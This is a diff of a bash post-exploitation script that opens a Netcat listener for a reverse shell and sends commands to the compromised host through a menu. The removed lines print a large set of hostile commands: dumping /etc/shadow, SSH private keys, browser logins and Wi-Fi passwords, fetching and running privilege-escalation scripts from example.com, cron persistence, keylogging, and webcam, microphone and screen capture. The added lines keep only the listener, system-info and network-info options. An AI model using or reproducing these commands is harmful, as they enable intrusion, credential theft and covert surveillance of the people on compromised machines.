@@ -1866,68 +1866,22 @@ post_exploitation() {
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
 
     # Run Netcat listener in the background
-    x-terminal-emulator -e "bash -c 'nc -lvnp $listen_port > /tmp/nc_output.txt & nc_pid=$!; echo $nc_pid > /tmp/nc_pid.txt'" &
+    x-terminal-emulator -e "bash -c 'nc -lvnp $listen_port > /tmp/nc_output.txt & echo $! > /tmp/nc_pid.txt'" &
 
     # Wait for the reverse shell connection to be established
-    sleep 3
+    sleep 5
 
     echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
     while true; do
         echo -e "1) Gather System Information"
-        echo -e "2) Enumerate Users and Groups"
-        echo -e "3) Check for Sudo Permissions"
-        echo -e "4) Search for Sensitive Files"
-        echo -e "5) Network Information"
-        echo -e "6) Privilege Escalation Scripts"
-        echo -e "7) Persistence Methods"
-        echo -e "8) Extract Password Hashes"
-        echo -e "9) Keylogging"
-        echo -e "10) Exploit Suggester"
-        echo -e "11) List Scheduled Tasks"
-        echo -e "12) List Installed Software"
-        echo -e "13) Collect Browser Data"
-        echo -e "14) Dump SSH Keys"
-        echo -e "15) Capture Screenshots"
-        echo -e "16) Monitor Network Traffic"
-        echo -e "17) Collect Wi-Fi Passwords"
-        echo -e "18) List Running Processes"
-        echo -e "19) Record Microphone"
-        echo -e "20) Webcam Capture"
-        echo -e "21) Check for Virtual Machines"
-        echo -e "22) Extract SSH Configuration"
-        echo -e "23) Extract Environment Variables"
-        echo -e "24) List Open Files"
-        echo -e "25) Enumerate Installed Services"
-        echo -e "26) Back to Main Menu"
+        echo -e "2) Network Interface Information"
+        echo -e "3) Back to Main Menu"
         read -p "Select an option: " post_option
 
         case $post_option in
             1) send_command "uname -a && lsb_release -a" ;;
-            2) send_command "cat /etc/passwd && cat /etc/group" ;;
-            3) send_command "sudo -l" ;;
-            4) send_command "find / -type f -name '*password*'" ;;
-            5) send_command "ifconfig && netstat -an" ;;
-            6) send_command "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" ;;
-            7) send_command "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" ;;
-            8) send_command "cat /etc/shadow" ;;
-            9) send_command "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" ;;
-            10) send_command "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" ;;
-            11) send_command "crontab -l && ls -al /etc/cron* && systemctl list-timers" ;;
-            12) send_command "dpkg -l || rpm -qa" ;;
-            13) send_command "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" ;;
-            14) send_command "cat ~/.ssh/id_rsa" ;;
-            15) send_command "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" ;;
-            16) send_command "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" ;;
-            17) send_command "grep -r '^psk=' /etc/NetworkManager/system-connections/" ;;
-            18) send_command "ps aux" ;;
-            19) send_command "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" ;;
-            20) send_command "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" ;;
-            21) send_command "dmesg | grep -i virtual && lscpu | grep Hypervisor" ;;
-            22) send_command "cat /etc/ssh/sshd_config" ;;
-            23) send_command "printenv" ;;
-            24) send_command "lsof" ;;
-            25) send_command "systemctl list-units --type=service" ;;
-            26) break ;;
+            2) send_command "ifconfig || ip a" ;;
+            3) break ;;
             *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
         esac
 
@@ -1942,7 +1896,11 @@ post_exploitation() {
 # Function to send command to the reverse shell
 send_command() {
     local cmd="$1"
-    echo "$cmd" > /dev/tcp/localhost/$listen_port
+    echo "$cmd" > /tmp/nc_command.txt
+    # Read the command from the file and send it to the reverse shell
+    cat /tmp/nc_command.txt > /dev/tcp/localhost/$listen_port
+    sleep 2  # Allow some time for the command to be processed
+    rm /tmp/nc_command.txt  # Clean up the command file
 }
 
 check_install_dependencies() {
